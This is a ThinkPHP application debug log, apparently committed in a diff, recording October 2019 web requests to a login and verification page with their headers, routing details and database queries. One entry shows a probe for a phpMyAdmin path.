+[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://s-6-2111.pssdss.com' LIMIT 1 [ RunTime:0.000134s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000448s ]
+[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000145s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000147s ]
+[ log ] ###user_id=time=2019-10-12 15:37:49function=user/index/login
+---------------------------------------------------------------
+[ 2019-10-12T15:37:49+08:00 ] 172.16.170.169 60.173.242.198 GET /user/index/verify
+[ info ] s-6-2111.pssdss.com/user/index/verify [运行时间：0.038169s][吞吐率：26.20req/s] [内存消耗：3,950.35kb] [文件加载：55]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'index',
+    2 => 'verify',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 's-6-2111.pssdss.com',
+  'connection' => 'keep-alive',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
+  'accept' => 'image/webp,image/apng,image/*,*/*;q=0.8',
+  'referer' => 'http://s-6-2111.pssdss.com/user/index/login',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
+  'cookie' => 'UM_distinctid=16dbed34a2f127-0b1b5b8cd60abe-67e1b3f-1fa400-16dbed34a308ef; PHPSESSID=ftvehtui4kco1mtm6id5b108t4',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\common\controller\Base->verify[ /www/wwwroot/web/application/common/controller/Base.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000411s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000659s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000189s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000620s ]
+[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000141s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000444s ]
+[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000110s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000453s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000190s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000486s ]
+[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://s-6-2111.pssdss.com' LIMIT 1 [ RunTime:0.000153s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000491s ]
+[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000151s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000195s ]
+[ log ] ###user_id=time=2019-10-12 15:37:49function=user/index/verify
+---------------------------------------------------------------
+[ 2019-10-12T15:37:50+08:00 ] 172.16.170.169 60.173.242.198 GET /favicon.ico
+[ info ] s-6-2111.pssdss.com/favicon.ico [运行时间：0.014980s][吞吐率：66.76req/s] [内存消耗：1,659.63kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 's-6-2111.pssdss.com',
+  'connection' => 'keep-alive',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
+  'accept' => 'image/webp,image/apng,image/*,*/*;q=0.8',
+  'referer' => 'http://s-6-2111.pssdss.com/user/index/login',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
+  'cookie' => 'UM_distinctid=16dbed34a2f127-0b1b5b8cd60abe-67e1b3f-1fa400-16dbed34a308ef; PHPSESSID=ftvehtui4kco1mtm6id5b108t4',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-10-12T16:50:12+08:00 ] 172.16.170.169 93.174.93.24 GET /
+[ info ] 47.96.126.228:80/ [运行时间：0.033018s][吞吐率：30.29req/s] [内存消耗：3,923.20kb] [文件加载：57]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'te' => 'deflate,gzip;q=0.3',
+  'connection' => 'TE, close',
+  'host' => '47.96.126.228:80',
+  'user-agent' => 'libwww-perl/6.39',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000418s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000829s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000200s ]
+---------------------------------------------------------------
+[ 2019-10-12T16:50:12+08:00 ] 172.16.170.169 93.174.93.24 GET /user/index/login
+[ info ] 47.96.126.228:80/user/index/login [运行时间：0.038059s][吞吐率：26.27req/s] [内存消耗：3,961.07kb] [文件加载：56]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'index',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'te' => 'deflate,gzip;q=0.3',
+  'connection' => 'TE, close',
+  'host' => '47.96.126.228:80',
+  'user-agent' => 'libwww-perl/6.39',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\Index->login[ /www/wwwroot/web/application/user/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/web/application/user/view/index/login.html [ array (
+  0 => 'request',
+  1 => 'param',
+  2 => 'userAgentType',
+  3 => 'is_super',
+  4 => 'allcinfig',
+  5 => 'msgNum',
+  6 => '__menu__',
+  7 => 'meta_title',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000341s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000813s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000236s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000652s ]
+[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000150s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000518s ]
+[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000118s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000489s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000144s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000485s ]
+[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://47.96.126.228:80' LIMIT 1 [ RunTime:0.000139s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000587s ]
+[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000153s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000180s ]
+[ log ] ###user_id=time=2019-10-12 16:50:12function=user/index/login
+---------------------------------------------------------------
+[ 2019-10-12T19:17:53+08:00 ] 172.16.170.169 39.128.42.88 GET /
+[ info ] s-6-2111.pssdss.com/ [运行时间：0.029590s][吞吐率：33.80req/s] [内存消耗：3,924.26kb] [文件加载：57]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 's-6-2111.pssdss.com',
+  'cookie' => 'UM_distinctid=16dbb15e65623-0aee7a8ee6eb63-1b133b65-c0000-16dbb15e65725d',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (iPad; CPU OS 13_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MQBHD/6.9.1 Safari/537.22',
+  'referer' => 'https://www.pssdss.com/d954.html',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000333s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000707s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000179s ]
+---------------------------------------------------------------
+[ 2019-10-12T19:17:53+08:00 ] 172.16.170.169 39.128.42.88 GET /user/index/login
+[ info ] s-6-2111.pssdss.com/user/index/login [运行时间：0.039487s][吞吐率：25.32req/s] [内存消耗：3,962.34kb] [文件加载：56]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'index',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 's-6-2111.pssdss.com',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'cookie' => 'PHPSESSID=fbi72bcnp7jfm25st41obk69t7; UM_distinctid=16dbb15e65623-0aee7a8ee6eb63-1b133b65-c0000-16dbb15e65725d',
+  'user-agent' => 'Mozilla/5.0 (iPad; CPU OS 13_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MQBHD/6.9.1 Safari/537.22',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\Index->login[ /www/wwwroot/web/application/user/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/web/application/user/view/index/login.html [ array (
+  0 => 'request',
+  1 => 'param',
+  2 => 'userAgentType',
+  3 => 'is_super',
+  4 => 'allcinfig',
+  5 => 'msgNum',
+  6 => '__menu__',
+  7 => 'meta_title',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000374s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000777s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000180s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000696s ]
+[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000146s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000517s ]
+[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000130s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000543s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000142s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000520s ]
+[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://s-6-2111.pssdss.com' LIMIT 1 [ RunTime:0.000131s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000487s ]
+[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000143s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000190s ]
+[ log ] ###user_id=time=2019-10-12 19:17:53function=user/index/login
+---------------------------------------------------------------
+[ 2019-10-12T19:17:53+08:00 ] 172.16.170.169 39.128.42.88 GET /user/index/verify
+[ info ] s-6-2111.pssdss.com/user/index/verify [运行时间：0.041160s][吞吐率：24.30req/s] [内存消耗：3,950.33kb] [文件加载：55]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'index',
+    2 => 'verify',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 's-6-2111.pssdss.com',
+  'accept' => 'image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5',
+  'connection' => 'keep-alive',
+  'cookie' => 'PHPSESSID=fbi72bcnp7jfm25st41obk69t7; UM_distinctid=16dbb15e65623-0aee7a8ee6eb63-1b133b65-c0000-16dbb15e65725d',
+  'user-agent' => 'Mozilla/5.0 (iPad; CPU OS 13_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MQBHD/6.9.1 Safari/537.22',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://s-6-2111.pssdss.com/user/index/login',
+  'accept-encoding' => 'gzip, deflate',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\common\controller\Base->verify[ /www/wwwroot/web/application/common/controller/Base.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000440s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000954s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000237s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000955s ]
+[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000195s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000667s ]
+[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000193s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000643s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000208s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000632s ]
+[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://s-6-2111.pssdss.com' LIMIT 1 [ RunTime:0.000198s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000611s ]
+[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000221s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000216s ]
+[ log ] ###user_id=time=2019-10-12 19:17:53function=user/index/verify
+---------------------------------------------------------------
+[ 2019-10-12T19:19:25+08:00 ] 172.16.170.169 39.128.42.88 GET /user/index/login
+[ info ] s-6-2111.pssdss.com/user/index/login [运行时间：0.036585s][吞吐率：27.33req/s] [内存消耗：3,963.43kb] [文件加载：56]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'index',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 's-6-2111.pssdss.com',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'upgrade-insecure-requests' => '1',
+  'cookie' => 'PHPSESSID=fbi72bcnp7jfm25st41obk69t7; UM_distinctid=16dbb15e65623-0aee7a8ee6eb63-1b133b65-c0000-16dbb15e65725d',
+  'user-agent' => 'Mozilla/5.0 (iPad; CPU OS 13_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MQBHD/6.9.1 Safari/537.22',
+  'accept-language' => 'zh-cn',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'keep-alive',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\Index->login[ /www/wwwroot/web/application/user/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/web/application/user/view/index/login.html [ array (
+  0 => 'request',
+  1 => 'param',
+  2 => 'userAgentType',
+  3 => 'is_super',
+  4 => 'allcinfig',
+  5 => 'msgNum',
+  6 => '__menu__',
+  7 => 'meta_title',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000340s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000766s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000243s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000700s ]
+[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000143s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000485s ]
+[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000121s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000502s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000149s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000468s ]
+[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://s-6-2111.pssdss.com' LIMIT 1 [ RunTime:0.000144s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000462s ]
+[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000150s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000154s ]
+[ log ] ###user_id=time=2019-10-12 19:19:25function=user/index/login
+---------------------------------------------------------------
+[ 2019-10-12T19:19:25+08:00 ] 172.16.170.169 39.128.42.88 GET /user/index/verify
+[ info ] s-6-2111.pssdss.com/user/index/verify [运行时间：0.037924s][吞吐率：26.37req/s] [内存消耗：3,950.33kb] [文件加载：55]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'index',
+    2 => 'verify',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 's-6-2111.pssdss.com',
+  'accept' => 'image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5',
+  'connection' => 'keep-alive',
+  'cookie' => 'PHPSESSID=fbi72bcnp7jfm25st41obk69t7; UM_distinctid=16dbb15e65623-0aee7a8ee6eb63-1b133b65-c0000-16dbb15e65725d',
+  'user-agent' => 'Mozilla/5.0 (iPad; CPU OS 13_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MQBHD/6.9.1 Safari/537.22',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://s-6-2111.pssdss.com/user/index/login',
+  'accept-encoding' => 'gzip, deflate',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\common\controller\Base->verify[ /www/wwwroot/web/application/common/controller/Base.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000345s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000695s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000191s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000831s ]
+[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000184s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000584s ]
+[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000115s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000509s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000141s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000455s ]
+[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://s-6-2111.pssdss.com' LIMIT 1 [ RunTime:0.000129s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000490s ]
+[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000141s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000146s ]
+[ log ] ###user_id=time=2019-10-12 19:19:25function=user/index/verify
+---------------------------------------------------------------
+[ 2019-10-12T19:23:02+08:00 ] 172.16.170.169 112.68.200.246 GET /phpmyadmin/
+[ info ] 47.96.126.228/phpmyadmin/ [运行时间：0.015915s][吞吐率：62.83req/s] [内存消耗：1,657.08kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'phpmyadmin',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'host' => '47.96.126.228',
+  'connection' => 'keep-alive',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-10-12T20:40:49+08:00 ] 172.16.170.169 183.129.160.229 GET /
+[ info ] 47.96.126.228:80/ [运行时间：0.042395s][吞吐率：23.59req/s] [内存消耗：3,922.66kb] [文件加载：57]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '47.96.126.228:80',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
+  'accept' => '*/*',
+  'connection' => 'keep-alive',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000435s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.001094s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000270s ]
